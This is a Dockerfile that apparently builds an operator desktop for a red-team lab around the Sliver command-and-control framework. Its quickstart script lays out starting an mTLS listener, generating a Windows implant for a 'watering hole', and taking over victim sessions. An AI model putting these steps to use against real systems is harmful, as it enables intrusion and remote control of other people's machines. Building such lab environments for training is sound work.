FROM kasmweb/ubuntu-jammy-desktop:1.14.0

USER root

ENV DEBIAN_FRONTEND=noninteractive

# Install C2 operator tools
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    nmap \
    net-tools \
    iputils-ping \
    traceroute \
    tcpdump \
    wireshark-common \
    tshark \
    dnsutils \
    whois \
    jq \
    python3 \
    python3-pip \
    openssh-client \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Download sliver client (for connecting to the C2 server)
RUN curl -fsSL https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux \
    -o /usr/local/bin/sliver \
    && chmod +x /usr/local/bin/sliver

# Create workspace for operator
RUN mkdir -p /home/kasm-user/c2-workspace/configs \
    && mkdir -p /home/kasm-user/c2-workspace/loot \
    && mkdir -p /home/kasm-user/Desktop

# Create desktop shortcut for terminal
RUN echo '[Desktop Entry]\n\
Type=Application\n\
Name=C2 Terminal\n\
Exec=xfce4-terminal --title="Sliver C2 Operator Console"\n\
Icon=utilities-terminal\n\
Terminal=false\n\
Categories=System;' > /home/kasm-user/Desktop/c2-terminal.desktop \
    && chmod +x /home/kasm-user/Desktop/c2-terminal.desktop

# Create quickstart guide on Desktop
RUN echo '#!/bin/bash\n\
echo "========================================"\n\
echo "  Sliver C2 Operator Quick Start"\n\
echo "========================================"\n\
echo ""\n\
echo "1. Import the operator config from the listening post:"\n\
echo "   sliver import /path/to/operator_config.cfg"\n\
echo ""\n\
echo "2. Connect to the C2 server:"\n\
echo "   sliver"\n\
echo ""\n\
echo "3. Start an mTLS listener (if not already running):"\n\
echo "   mtls --lhost <listening-post-dmz-ip> --lport 31337"\n\
echo ""\n\
echo "4. Generate an implant for the watering hole:"\n\
echo "   generate --mtls <listening-post-dmz-ip>:31337 --os windows --save /tmp/implant.exe"\n\
echo ""\n\
echo "5. Wait for victim to download and execute the implant"\n\
echo "6. When session appears, interact with it:"\n\
echo "   sessions"\n\
echo "   use <session-id>"\n\
echo ""\n\
echo "========================================"\n\
' > /home/kasm-user/Desktop/quickstart.sh \
    && chmod +x /home/kasm-user/Desktop/quickstart.sh

# Fix ownership
RUN chown -R 1000:1000 /home/kasm-user/c2-workspace /home/kasm-user/Desktop

USER 1000
WORKDIR /home/kasm-user
